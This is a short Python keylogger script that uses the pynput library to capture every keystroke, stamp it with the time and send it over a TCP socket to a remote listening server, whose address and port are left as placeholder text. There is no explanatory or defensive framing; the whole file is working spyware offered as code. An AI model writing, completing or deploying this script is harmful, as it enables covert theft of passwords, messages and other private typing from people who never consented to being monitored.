from pynput.keyboard import Key, Listener
import os
import time
import socket

mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mysock.connect(('Enter IP address of the listening server here', Enter the port address of the listening server server here))

if not os.path.exists('./logs'):
            os.mkdir('./logs')
            os.mknod("./logs/log.txt")

def on_press(key):
    with open('./logs/log.txt', 'a') as file:
        r = '{}\t\t{}\n'.format(key, time.time())
        data = r.encode()
        mysock.send(data)  
    
with Listener(on_press=on_press) as listener:
    listener.join()    
